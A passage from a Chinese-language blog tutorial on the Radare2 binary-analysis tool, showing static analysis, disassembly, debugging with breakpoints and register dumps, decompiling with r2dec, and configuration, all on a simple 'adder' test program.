<span class="hljs-built_in">bind</span>   <span class="hljs-built_in">type</span>   lib name<br>―――――――――――――――――――――――――――――――――――――<br>1   0x00000000 WEAK   NOTYPE     _ITM_deregisterTMCloneTable<br>2   0x004004a0 GLOBAL FUNC       <span class="hljs-built_in">printf</span><br>3   0x00000000 GLOBAL FUNC       __libc_start_main<br>4   0x00000000 WEAK   NOTYPE     __gmon_start__<br>5   0x00000000 WEAK   NOTYPE     _ITM_registerTMCloneTable<br></code></pre></td></tr></table></figure><p>该二进制也可以有自己的符号、函数或数据。这些函数通常显示在 <code>Exports</code> 下。这个测试的二进制导出了两个函数：<code>main</code> 和 <code>adder</code>。其余的函数是在编译阶段，当二进制文件被构建时添加的。加载器需要这些函数来加载二进制文件（现在不用太关心它们）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">[0x004004b0]&gt;<br>[0x004004b0]&gt; iE<br>[Exports]<br>nth paddr       vaddr      <span class="hljs-built_in">bind</span>   <span class="hljs-built_in">type</span>   size lib name<br>――――――――――――――――――――――――――――――――――――――――――――――――――――――<br>82   0x00000650 0x00400650 GLOBAL FUNC   5        __libc_csu_fini<br>85   ---------- 0x00601024 GLOBAL NOTYPE 0        _edata<br>86   0x00000658 0x00400658 GLOBAL FUNC   0        _fini<br>89   0x00001020 0x00601020 GLOBAL NOTYPE 0        __data_start<br>90   0x00000596 0x00400596 GLOBAL FUNC   15       adder<br>92   0x00000670 0x00400670 GLOBAL OBJ    0        __dso_handle<br>93   0x00000668 0x00400668 GLOBAL OBJ    4        _IO_stdin_used<br>94   0x000005e0 0x004005e0 GLOBAL FUNC   101      __libc_csu_init<br>95   ---------- 0x00601028 GLOBAL NOTYPE 0        _end<br>96   0x000004e0 0x004004e0 GLOBAL FUNC   5        _dl_relocate_static_pie<br>97   0x000004b0 0x004004b0 GLOBAL FUNC   47       _start<br>98   ---------- 0x00601024 GLOBAL NOTYPE 0        __bss_start<br>99   0x000005a5 0x004005a5 GLOBAL FUNC   55       main<br>100  ---------- 0x00601028 GLOBAL OBJ    0        __TMC_END__<br>102  0x00000468 0x00400468 GLOBAL FUNC   0        _init<br>[0x004004b0]&gt;<br></code></pre></td></tr></table></figure><h3 id="哈希信息"><a href="#哈希信息" class="headerlink" title="哈希信息"></a>哈希信息</h3><p>如何知道两个二进制文件是否相似？你不能只是打开一个二进制文件并查看里面的源代码。在大多数情况下，二进制文件的哈希值（md5sum、sha1、sha256）是用来唯一识别它的。你可以使用 <code>it</code> 命令找到二进制的哈希值：</p><ol><li><code>[0x004004b0]&gt; it</code></li><li><code>md5 7e6732f2b11dec4a0c7612852cede670</code></li><li><code>sha1 d5fa848c4b53021f6570dd9b18d115595a2290ae</code></li><li><code>sha256 13dd5a492219dac1443a816ef5f91db8d149e8edbf26f24539c220861769e1c2</code></li><li><code>[0x004004b0]&gt;</code></li></ol><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>代码按函数分组；要列出二进制中存在的函数，请运行 <code>afl</code> 命令。下面的列表显示了 <code>main</code> 函数和 <code>adder</code> 函数。通常，以 <code>sym.imp</code> 开头的函数是从标准库（这里是 glibc）中导入的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[0x004004b0]&gt; afl<br>0x004004b0    1 46           entry0<br>0x004004f0    4 41   -&gt; 34   sym.deregister_tm_clones<br>0x00400520    4 57   -&gt; 51   sym.register_tm_clones<br>0x00400560    3 33   -&gt; 32   sym.__do_global_dtors_aux<br>0x00400590    1 6            entry.init0<br>0x00400650    1 5            sym.__libc_csu_fini<br>0x00400658    1 13           sym._fini<br>0x00400596    1 15           sym.adder<br>0x004005e0    4 101          loc..annobin_elf_init.c<br>0x004004e0    1 5            loc..annobin_static_reloc.c<br>0x004005a5    1 55           main<br>0x004004a0    1 6            sym.imp.printf<br>0x00400468    3 27           sym._init<br>[0x004004b0]&gt;<br></code></pre></td></tr></table></figure><h3 id="交叉引用"><a href="#交叉引用" class="headerlink" title="交叉引用"></a>交叉引用</h3><p>在 C 语言中，<code>main</code> 函数是一个程序开始执行的地方。理想情况下，其他函数都是从 <code>main</code> 函数调用的，在退出程序时，<code>main</code> 函数会向操作系统返回一个退出状态。这在源代码中是很明显的，然而，二进制程序呢？如何判断 <code>adder</code> 函数的调用位置呢？</p><p>你可以使用 <code>axt</code> 命令，后面加上函数名，看看 <code>adder</code> 函数是在哪里调用的；如下图所示，它是从 <code>main</code> 函数中调用的。这就是所谓的交叉引用cross-referencing。但什么调用 <code>main</code> 函数本身呢？从下面的 <code>axt main</code> 可以看出，它是由 <code>entry0</code> 调用的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[0x004004b0]&gt; axt sym.adder<br>main 0x4005b9 [CALL] call sym.adder<br>[0x004004b0]&gt;<br>[0x004004b0]&gt; axt main<br>entry0 0x4004d1 [DATA] mov rdi, main<br>[0x004004b0]&gt;<br></code></pre></td></tr></table></figure><h3 id="寻找定位"><a href="#寻找定位" class="headerlink" title="寻找定位"></a>寻找定位</h3><p>在处理文本文件时，你经常通过引用行号和行或列号在文件内移动；在二进制文件中，你需要使用地址。这些是以 <code>0x</code> 开头的十六进制数字，后面跟着一个地址。要找到你在二进制中的位置，运行 <code>s</code> 命令。要移动到不同的位置，使用 <code>s</code> 命令，后面跟上地址。</p><p>函数名就像标签一样，内部用地址表示。如果函数名在二进制中（未剥离的），可以使用函数名后面的 <code>s</code> 命令跳转到一个特定的函数地址。同样，如果你想跳转到二进制的开始，输入 <code>s 0</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[0x004004b0]&gt; s<br>0x4004b0<br>[0x004004b0]&gt;<br>[0x004004b0]&gt; s main<br>[0x004005a5]&gt;<br>[0x004005a5]&gt; s<br>0x4005a5<br>[0x004005a5]&gt;<br>[0x004005a5]&gt; s sym.adder<br>[0x00400596]&gt;<br>[0x00400596]&gt; s<br>0x400596<br>[0x00400596]&gt;<br>[0x00400596]&gt; s 0<br>[0x00000000]&gt;<br>[0x00000000]&gt; s<br>0x0<br>[0x00000000]&gt;<br></code></pre></td></tr></table></figure><h3 id="十六进制视图"><a href="#十六进制视图" class="headerlink" title="十六进制视图"></a>十六进制视图</h3><p>通常情况下，原始二进制没有意义。在十六进制模式下查看二进制及其等效的 ASCII 表示法会有帮助：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">[0x004004b0]&gt; s main<br>[0x004005a5]&gt;<br>[0x004005a5]&gt; px<br>- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF<br>0x004005a5  5548 89e5 4883 ec10 c745 fc64 0000 008b  UH..H....E.d....<br>0x004005b5  45fc 89c7 e8d8 ffff ff89 45f8 8b45 f889  E.........E..E..<br>0x004005c5  c6bf 7806 4000 b800 0000 00e8 cbfe ffff  ..x.@...........<br>0x004005d5  b800 0000 00c9 c30f 1f40 00f3 0f1e fa41  .........@.....A<br>0x004005e5  5749 89d7 4156 4989 f641 5541 89fd 4154  WI..AVI..AUA..AT<br>0x004005f5  4c8d 2504 0820 0055 488d 2d04 0820 0053  L.%.. .UH.-.. .S<br>0x00400605  4c29 e548 83ec 08e8 57fe ffff 48c1 fd03  L).H....W...H...<br>0x00400615  741f 31db 0f1f 8000 0000 004c 89fa 4c89  t.1........L..L.<br>0x00400625  f644 89ef 41ff 14dc 4883 c301 4839 dd75  .D..A...H...H9.u<br>0x00400635  ea48 83c4 085b 5d41 5c41 5d41 5e41 5fc3  .H...[]A\A]A^A_.<br>0x00400645  9066 2e0f 1f84 0000 0000 00f3 0f1e fac3  .f..............<br>0x00400655  0000 00f3 0f1e fa48 83ec 0848 83c4 08c3  .......H...H....<br>0x00400665  0000 0001 0002 0000 0000 0000 0000 0000  ................<br>0x00400675  0000 004e 756d 6265 7220 6e6f 7720 6973  ...Number now is<br>0x00400685  2020 3a20 2564 0a00 0000 0001 1b03 3b44    : %d........;D<br>0x00400695  0000 0007 0000 0000 feff ff88 0000 0020  ...............<br>[0x004005a5]&gt;<br></code></pre></td></tr></table></figure><h3 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h3><p>如果你使用的是编译后的二进制文件，则无法查看源代码。编译器将源代码转译成 CPU 可以理解和执行的机器语言指令；其结果就是二进制或可执行文件。然而，你可以查看汇编指令（的助记词）来理解程序正在做什么。例如，如果你想查看 <code>main</code> 函数在做什么，你可以使用 <code>s main</code> 寻找 <code>main</code> 函数的地址，然后运行 <code>pdf</code> 命令来查看反汇编的指令。</p><p>要理解汇编指令，你需要参考体系结构手册（这里是 x86），它的应用二进制接口（ABI，或调用惯例），并对堆栈的工作原理有基本的了解：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">[0x004004b0]&gt; s main<br>[0x004005a5]&gt;<br>[0x004005a5]&gt; s<br>0x4005a5<br>[0x004005a5]&gt;<br>[0x004005a5]&gt; pdf<br>            ; DATA XREF from entry0 @ 0x4004d1<br>┌ 55: int main (int argc, char **argv, char **envp);<br>│           ; var int64_t var_8h @ rbp-0x8<br>│           ; var int64_t var_4h @ rbp-0x4<br>│           0x004005a5      55             push rbp<br>│           0x004005a6      4889e5         mov rbp, rsp<br>│           0x004005a9      4883ec10       sub rsp, 0x10<br>│           0x004005ad      c745fc640000.  mov dword [var_4h], 0x64    ; <span class="hljs-string">&#x27;d&#x27;</span> ; 100<br>│           0x004005b4      8b45fc         mov eax, dword [var_4h]<br>│           0x004005b7      89c7           mov edi, eax<br>│           0x004005b9      e8d8ffffff     call sym.adder<br>│           0x004005be      8945f8         mov dword [var_8h], eax<br>│           0x004005c1      8b45f8         mov eax, dword [var_8h]<br>│           0x004005c4      89c6           mov esi, eax<br>│           0x004005c6      bf78064000     mov edi, str.Number_now_is__:__d ; 0x400678 ; <span class="hljs-string">&quot;Number now is  : %d\n&quot;</span> ; const char *format<br>│           0x004005cb      b800000000     mov eax, 0<br>│           0x004005d0      e8cbfeffff     call sym.imp.printf         ; int <span class="hljs-built_in">printf</span>(const char *format)<br>│           0x004005d5      b800000000     mov eax, 0<br>│           0x004005da      c9             leave<br>└           0x004005db      c3             ret<br>[0x004005a5]&gt;<br></code></pre></td></tr></table></figure><p><code>adder</code> 函数的反汇编结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[0x004005a5]&gt; s sym.adder<br>[0x00400596]&gt;<br>[0x00400596]&gt; s<br>0x400596<br>[0x00400596]&gt;<br>[0x00400596]&gt; pdf<br>            ; CALL XREF from main @ 0x4005b9<br>┌ 15: sym.adder (int64_t arg1);<br>│           ; var int64_t var_4h @ rbp-0x4<br>│           ; arg int64_t arg1 @ rdi<br>│           0x00400596      55             push rbp<br>│           0x00400597      4889e5         mov rbp, rsp<br>│           0x0040059a      897dfc         mov dword [var_4h], edi     ; arg1<br>│           0x0040059d      8b45fc         mov eax, dword [var_4h]<br>│           0x004005a0      83c001         add eax, 1<br>│           0x004005a3      5d             pop rbp<br>└           0x004005a4      c3             ret<br>[0x00400596]&gt;<br></code></pre></td></tr></table></figure><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>查看二进制中存在哪些字符串可以作为二进制分析的起点。字符串是硬编码到二进制中的，通常会提供重要的提示，可以让你将重点转移到分析某些区域。在二进制中运行 <code>iz</code> 命令来列出所有的字符串。这个测试二进制中只有一个硬编码的字符串：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[0x004004b0]&gt; iz<br>[Strings]<br>nth paddr      vaddr      len size section <span class="hljs-built_in">type</span>  string<br>―――――――――――――――――――――――――――――――――――――――――――――――――――――――<br>0   0x00000678 0x00400678 20  21   .rodata ascii Number now is  : %d\n<br>[0x004004b0]&gt;<br></code></pre></td></tr></table></figure><h3 id="交叉引用字符串"><a href="#交叉引用字符串" class="headerlink" title="交叉引用字符串"></a>交叉引用字符串</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[0x004004b0]&gt; ps @ 0x400678<br>Number now is  : %d<br>[0x004004b0]&gt;<br>[0x004004b0]&gt; axt 0x400678<br>main 0x4005c6 [DATA] mov edi, str.Number_now_is__:__d<br>[0x004004b0]&gt;<br></code></pre></td></tr></table></figure><h3 id="可视模式"><a href="#可视模式" class="headerlink" title="可视模式"></a>可视模式</h3><p>当你的代码很复杂，有多个函数被调用时，很容易迷失方向。如果能以图形或可视化的方式查看哪些函数被调用，根据某些条件采取了哪些路径等，会很有帮助。在移动到感兴趣的函数后，可以通过 <code>VV</code> 命令来探索 <code>r2</code> 的可视化模式。例如，对于 <code>adder</code> 函数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[0x004004b0]&gt; s sym.adder<br>[0x00400596]&gt;<br>[0x00400596]&gt; VV<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204142131072.png" alt="(Gaurav Kamathe, CC BY-SA 4.0)"></p><h3 id="调试器"><a href="#调试器" class="headerlink" title="调试器"></a>调试器</h3><p>到目前为止，你一直在做的是静态分析 —— 你只是在看二进制文件中的东西，而没有运行它，有时你需要执行二进制文件，并在运行时分析内存中的各种信息。<code>r2</code> 的内部调试器允许你运行二进制文件、设置断点、分析变量的值、或者转储寄存器的内容。</p><p>用 <code>-d</code> 标志启动调试器，并在加载二进制时添加 <code>-A</code> 标志进行分析。你可以通过使用 <code>db &lt;function-name&gt;</code> 命令在不同的地方设置断点，比如函数或内存地址。要查看现有的断点，使用 <code>dbi</code> 命令。一旦你放置了断点，使用 <code>dc</code> 命令开始运行二进制文件。你可以使用 <code>dbt</code> 命令查看堆栈，它可以显示函数调用。最后，你可以使用 <code>drr</code> 命令转储寄存器的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ r2 -d -A ./adder<br>Process with PID 17453 started...<br>= attach 17453 17453<br>bin.baddr 0x00400000<br>Using 0x400000<br>asm.bits 64<br>[x] Analyze all flags starting with sym. and entry0 (aa)<br>[x] Analyze <span class="hljs-keyword">function</span> calls (aac)<br>[x] Analyze len bytes of instructions <span class="hljs-keyword">for</span> references (aar)<br>[x] Check <span class="hljs-keyword">for</span> vtables<br>[x] Type matching analysis <span class="hljs-keyword">for</span> all <span class="hljs-built_in">functions</span> (aaft)<br>[x] Propagate noreturn information<br>[x] Use -AA or aaaa to perform additional experimental analysis.<br> -- git checkout hamster<br>[0x7f77b0a28030]&gt;<br>[0x7f77b0a28030]&gt; db main<br>[0x7f77b0a28030]&gt;<br>[0x7f77b0a28030]&gt; db sym.adder<br>[0x7f77b0a28030]&gt;<br>[0x7f77b0a28030]&gt; dbi<br>0 0x004005a5 E:1 T:0<br>1 0x00400596 E:1 T:0<br>[0x7f77b0a28030]&gt;<br>[0x7f77b0a28030]&gt; afl | grep main<br>0x004005a5    1 55           main<br>[0x7f77b0a28030]&gt;<br>[0x7f77b0a28030]&gt; afl | grep sym.adder<br>0x00400596    1 15           sym.adder<br>[0x7f77b0a28030]&gt;<br>[0x7f77b0a28030]&gt; dc<br>hit breakpoint at: 0x4005a5<br>[0x004005a5]&gt;<br>[0x004005a5]&gt; dbt<br>0  0x4005a5           sp: 0x0                 0    [main]  main sym.adder+15<br>1  0x7f77b0687873     sp: 0x7ffe35ff6858      0    [??]  section..gnu.build.attributes-1345820597<br>2  0x7f77b0a36e0a     sp: 0x7ffe35ff68e8      144  [??]  map.usr_lib64_ld_2.28.so.r_x+65034<br>[0x004005a5]&gt; dc<br>hit breakpoint at: 0x400596<br>[0x00400596]&gt; dbt<br>0  0x400596           sp: 0x0                 0    [sym.adder]  rip entry.init0+6<br>1  0x4005be           sp: 0x7ffe35ff6838      0    [main]  main+25<br>2  0x7f77b0687873     sp: 0x7ffe35ff6858      32   [??]  section..gnu.build.attributes-1345820597<br>3  0x7f77b0a36e0a     sp: 0x7ffe35ff68e8      144  [??]  map.usr_lib64_ld_2.28.so.r_x+65034<br>[0x00400596]&gt;<br>[0x00400596]&gt;<br>[0x00400596]&gt; dr<br>rax = 0x00000064<br>rbx = 0x00000000<br>rcx = 0x7f77b0a21738<br>rdx = 0x7ffe35ff6948<br>r8 = 0x7f77b0a22da0<br>r9 = 0x7f77b0a22da0<br>r10 = 0x0000000f<br>r11 = 0x00000002<br>r12 = 0x004004b0<br>r13 = 0x7ffe35ff6930<br>r14 = 0x00000000<br>r15 = 0x00000000<br>rsi = 0x7ffe35ff6938<br>rdi = 0x00000064<br>rsp = 0x7ffe35ff6838<br>rbp = 0x7ffe35ff6850<br>rip = 0x00400596<br>rflags = 0x00000202<br>orax = 0xffffffffffffffff<br>[0x00400596]&gt;<br></code></pre></td></tr></table></figure><h3 id="反编译器"><a href="#反编译器" class="headerlink" title="反编译器"></a>反编译器</h3><p>能够理解汇编是二进制分析的前提。汇编语言总是与二进制建立和预期运行的架构相关。一行源代码和汇编代码之间从来没有 1:1 的映射。通常，一行 C 源代码会产生多行汇编代码。所以，逐行读取汇编代码并不是最佳的选择。</p><p>这就是反编译器的作用。它们试图根据汇编指令重建可能的源代码。这与用于创建二进制的源代码绝不完全相同，它是基于汇编的源代码的近似表示。另外，要考虑到编译器进行的优化，它会生成不同的汇编代码以加快速度，减小二进制的大小等，会使反编译器的工作更加困难。另外，恶意软件作者经常故意混淆代码，让恶意软件的分析人员望而却步。</p><p>Radare2 通过插件提供反编译器。你可以安装任何 Radare2 支持的反编译器。使用 <code>r2pm -l</code> 命令可以查看当前插件。使用 <code>r2pm install</code> 命令来安装一个示例的反编译器 <code>r2dec</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ r2pm  -l<br>$<br>$ r2pm install r2dec<br>Cloning into <span class="hljs-string">&#x27;r2dec&#x27;</span>...<br>remote: Enumerating objects: 100, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (100/100), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (97/97), <span class="hljs-keyword">done</span>.<br>remote: Total 100 (delta 18), reused 27 (delta 1), pack-reused 0<br>Receiving objects: 100% (100/100), 1.01 MiB | 1.31 MiB/s, <span class="hljs-keyword">done</span>.<br>Resolving deltas: 100% (18/18), <span class="hljs-keyword">done</span>.<br>Install Done For r2dec<br>gmake: Entering directory <span class="hljs-string">&#x27;/root/.local/share/radare2/r2pm/git/r2dec/p&#x27;</span><br>[CC] duktape/duktape.o<br>[CC] duktape/duk_console.o<br>[CC] core_pdd.o<br>[CC] core_pdd.so<br>gmake: Leaving directory <span class="hljs-string">&#x27;/root/.local/share/radare2/r2pm/git/r2dec/p&#x27;</span><br>$<br>$ r2pm  -l<br>r2dec<br>$<br></code></pre></td></tr></table></figure><h3 id="反编译器视图"><a href="#反编译器视图" class="headerlink" title="反编译器视图"></a>反编译器视图</h3><p>要反编译一个二进制文件，在 <code>r2</code> 中加载二进制文件并自动分析它。在本例中，使用 <code>s sym.adder</code> 命令移动到感兴趣的 <code>adder</code> 函数，然后使用 <code>pdda</code> 命令并排查看汇编和反编译后的源代码。阅读这个反编译后的源代码往往比逐行阅读汇编更容易：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ r2 -A ./adder<br>[x] Analyze all flags starting with sym. and entry0 (aa)<br>[x] Analyze <span class="hljs-keyword">function</span> calls (aac)<br>[x] Analyze len bytes of instructions <span class="hljs-keyword">for</span> references (aar)<br>[x] Check <span class="hljs-keyword">for</span> vtables<br>[x] Type matching analysis <span class="hljs-keyword">for</span> all <span class="hljs-built_in">functions</span> (aaft)<br>[x] Propagate noreturn information<br>[x] Use -AA or aaaa to perform additional experimental analysis.<br> -- What <span class="hljs-keyword">do</span> you want to debug today?<br>[0x004004b0]&gt;<br>[0x004004b0]&gt; s sym.adder<br>[0x00400596]&gt;<br>[0x00400596]&gt; s<br>0x400596<br>[0x00400596]&gt;<br>[0x00400596]&gt; pdda<br>    ; assembly                               | /* r2dec pseudo code output */<br>                                             | /* ./adder @ 0x400596 */<br>                                             | <span class="hljs-comment">#include &amp;lt;stdint.h&gt;</span><br>                                             |  <br>    ; (fcn) sym.adder ()                     | int32_t adder (int64_t arg1) &#123;<br>                                             |     int64_t var_4h;<br>                                             |     rdi = arg1;<br>    0x00400596 push rbp                      |    <br>    0x00400597 mov rbp, rsp                  |    <br>    0x0040059a mov dword [rbp - 4], edi      |     *((rbp - <span class="hljs-number">4</span>)) = edi;<br>    0x0040059d mov eax, dword [rbp - 4]      |     eax = *((rbp - <span class="hljs-number">4</span>));<br>    0x004005a0 add eax, 1                    |     eax++;<br>    0x004005a3 pop rbp                       |    <br>    0x004005a4 ret                           |     <span class="hljs-built_in">return</span> eax;<br>                                             | &#125;<br>[0x00400596]&gt;<br></code></pre></td></tr></table></figure><h3 id="配置设置"><a href="#配置设置" class="headerlink" title="配置设置"></a>配置设置</h3><p>随着你对 Radare2 的使用越来越熟悉，你会想改变它的配置，以适应你的工作方式。你可以使用 <code>e</code> 命令查看 <code>r2</code> 的默认配置。要设置一个特定的配置，在 <code>e</code> 命令后面添加 <code>config = value</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[0x004005a5]&gt; e | <span class="hljs-built_in">wc</span> -l<br>593<br>[0x004005a5]&gt; e | grep syntax<br>asm.syntax = intel<br>[0x004005a5]&gt;<br>[0x004005a5]&gt; e asm.syntax = att<br>[0x004005a5]&gt;<br>[0x004005a5]&gt; e | grep syntax<br>asm.syntax = att<br>[0x004005a5]&gt;<br></code></pre></td></tr></table></figure><p>要使配置更改永久化，请将它们放在 <code>r2</code> 启动时读取的名为 <code>.radare2rc</code> 的启动文件中。这个文件通常在你的主目录下，如果没有，你可以创建一个。一些示例配置选项包括：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> ~/.radare2rc<br>e asm.syntax = att<br>e scr.utf8 = <span class="hljs-literal">true</span><br>eco solarized<br>e cmd.stack = <span class="hljs-literal">true</span><br>e stack.size = 256<br>$<br></code></pre></td></tr></table></figure><h3 id="探索更多"><a href="#探索更多" class="headerlink" title="探索更多"></a>探索更多</h3><p>你已经看到了足够多的 Radare2 功能，对这个工具有了一定的了解。因为 Radare2 遵循 Unix 哲学，即使你可以从它的主控台做各种事情，它也会在下面使用一套独立的二进制来完成它的任务。</p><p>探索下面列出的独立二进制文件，看看它们是如何工作的。例如，用 <code>iI</code> 命令在控制台看到的二进制信息也可以用 <code>rabin2 &lt;binary&gt;</code> 命令找到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> bin/<br>$<br>$ <span class="hljs-built_in">ls</span><br>prefix  r2agent    r2pm  rabin2   radiff2  ragg2    rarun2   rasm2<br>r2      r2-indent  r2r   radare2  rafind2  rahash2  rasign2  rax2<br>$<br></code></pre></td></tr></table></figure><p>evilpan大佬的radare2逆向笔记</p><p><a 